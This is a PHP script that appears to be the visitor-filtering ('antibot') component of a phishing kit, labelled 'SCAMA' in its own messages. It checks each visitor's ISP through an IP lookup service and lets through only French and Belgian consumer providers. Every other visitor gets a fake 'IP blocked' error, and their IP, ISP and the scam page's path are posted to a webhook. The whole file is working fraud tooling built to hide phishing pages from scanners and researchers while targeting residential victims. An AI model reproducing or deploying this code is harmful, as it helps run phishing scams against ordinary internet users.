<?php
session_start();

$webhook_ipblockees = "";

$ip = $_SERVER['REMOTE_ADDR'];
function getIpInfo($ip = '') {
     $ipinfo = file_get_contents("http://ip-api.com/json/".$ip);
    $ipinfo_json = json_decode($ipinfo, true);
    return $ipinfo_json;
}
    $visitor_ip = $_SERVER['REMOTE_ADDR'];
    $ipinfo_json = getIpInfo($visitor_ip);
	if($ipinfo_json['status'] != 'fail'){

		$org = "{$ipinfo_json['as']}";
		$isps = "{$ipinfo_json['isp']}";
	
	  }
	  else{
	
		$org = "Introuvable";
		$isps = "Introuvable";
	
	  }



if(strpos(strtolower($org),"bouygues") || strpos(strtolower($org),"orange") || strpos(strtolower($org),"voo") || strpos(strtolower($org),"proximus") || strpos(strtolower($org),"telenet") || strpos(strtolower($org),"scarlet") || strpos(strtolower($org),"skynet") || strpos(strtolower($org),"neuf") || strpos(strtolower($org),"sfr") || strpos(strtolower($org),"prixtel") || strpos(strtolower($org),"free") || strpos(strtolower($org),"laposte") || strpos(strtolower($org),"wanadoo") || strpos(strtolower($org),"online") || strpos(strtolower($org),"cegetel") || strpos(strtolower($org),"sosh") || strpos(strtolower($org),"proximus") || strpos(strtolower($org),"belgacom") || strpos(strtolower($org),"telenet") || strpos(strtolower($org),"scarlet") || $ip == "::1")
{

	

}
else
{
	 $entetedc = [ 'Content-Type: application/json; charset=utf-8' ];
			$POST = [ 'username' => 'ANTIBOTS', 'content' => '
⛔ ACCES BLOQUÉ MIAUW GG ⛔ 

🌐 ISP : '.$isps.'
🌐 ADRESSE IP : '.$ip.'

🚀 SCAMA : '.$_SERVER['PHP_SELF'].'


			' ];

			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $webhook_ipblockees);
			curl_setopt($ch, CURLOPT_POST, true);
			curl_setopt($ch, CURLOPT_HTTPHEADER, $entetedc);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
			$reponse   = curl_exec($ch);
die('YOUR IP HAS BEEN BLOCKED FROM THIS WEB SITE : ERROR CODE : 7854987458745248');
         
}




?>